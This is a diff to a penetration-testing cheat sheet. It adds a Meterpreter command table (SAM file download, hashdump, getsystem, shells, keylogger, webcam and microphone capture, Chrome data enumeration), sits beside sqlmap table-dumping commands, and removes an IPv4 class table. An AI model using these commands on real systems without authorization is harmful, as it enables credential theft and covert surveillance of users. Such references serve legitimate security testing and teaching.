@@ -132,19 +132,26 @@ Nmap (“Network Mapper”) is a free and open-source utility for network discov
 | `sqlmap -o -u "http://meh.com/form/" --forms`                                                 | SQLMap check form for injection                                                                  |
 | `sqlmap -o -u "http://meh/vuln-form" --forms -D database-name -T users --dump`                 | SQLMap dump and crack hashes for table users on database-name                                     |
 
+### Meterpreter Cheat Sheet
 
-#IPv4 🌎
+| Command                | Description                                          |
+|------------------------|------------------------------------------------------|
+| upload file c:\\windows | Upload file to Windows target                        |
+| download c:\\windows\\repair\\sam /tmp | Download file from Windows target          |
+| execute -f c:\\windows\temp\exploit.exe | Run .exe on target                          |
+| execute -f cmd -c       | Creates new channel with cmd shell                   |
+| ps                     | Show processes                                       |
+| shell                  | Get shell on the target                              |
+| getsystem              | Attempts privilege escalation on the target           |
+| hashdump               | Dump the hashes on the target                         |
+| portfwd add –l 3389 –p 3389 –r target | Create port forward to target machine     |
+| portfwd delete –l 3389 –p 3389 –r target | Delete port forward                      |
+| screenshot             | Capture screenshot of the target machine             |
+| keyscan_start          | Start keylogger                                      |
+| keyscan_dump           | Dump collected keystrokes                            |
+| webcam_snap            | Take webcam snapshot                                 |
+| record_mic             | Record microphone                                    |
+| enum_chrome            | Enumerate Chrome browser data                        |
 
-Classful IP Ranges 📈
-*Note: Class A, B, C are deprecated*
-╔══════════╦════════════════════════════════════╗
-║ Class    ║ IP Address Range                   ║
-╠══════════╬════════════════════════════════════╣
-║ Class A 1️⃣ ║ 0.0.0.0 – 127.255.255.255        ║
-║ Class B 2️⃣ ║ 128.0.0.0 – 191.255.255.255      ║
-║ Class C 3️⃣ ║ 192.0.0.0 – 223.255.255.255      ║
-║ Class D 4️⃣ ║ 224.0.0.0 – 239.255.255.255      ║
-║ Class E 5️⃣ ║ 240.0.0.0 – 255.255.255.255      ║
-╚══════════╩════════════════════════════════════╝
 
 
